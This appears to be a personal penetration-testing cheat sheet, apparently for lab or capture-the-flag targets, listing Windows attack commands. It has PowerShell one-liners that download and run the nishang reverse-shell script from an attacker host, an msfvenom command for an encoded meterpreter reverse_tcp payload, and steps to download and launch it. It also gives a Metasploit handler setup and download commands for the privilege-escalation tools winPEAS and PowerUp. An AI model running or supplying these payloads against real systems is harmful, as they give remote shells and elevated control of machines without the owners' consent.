# reverses 

## windows ncat binary

https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe


## nishang reverse tcp binary

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1


Use python2 -m SimpleHTTPServer 8888 : to serve

nc -lvp 4445 : listener

powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.121.196:8888/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.121.196 -Port 4445"

powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.92.19:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.92.19 -Port 4444


## meterpreter 

Generate

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

Download

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.92.19:8080/meter.exe','meter.exe')"
  
Listen

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.92.19 set LPORT 4445 run


Start 

Start-Process "meter.exe"
  
  

# Privilege elevation

## winPea
https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEASany.exe


## PowerUp 

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

PS > . .\Powerup.ps1
PS > Invoke-Allchecks  



# Download file

powershell (new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')

powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.121.196:8888/winPEASany.exe','C:\Users\bill\Desktop\winPEASany.exe')


Start-Process "winPEASany.exe"


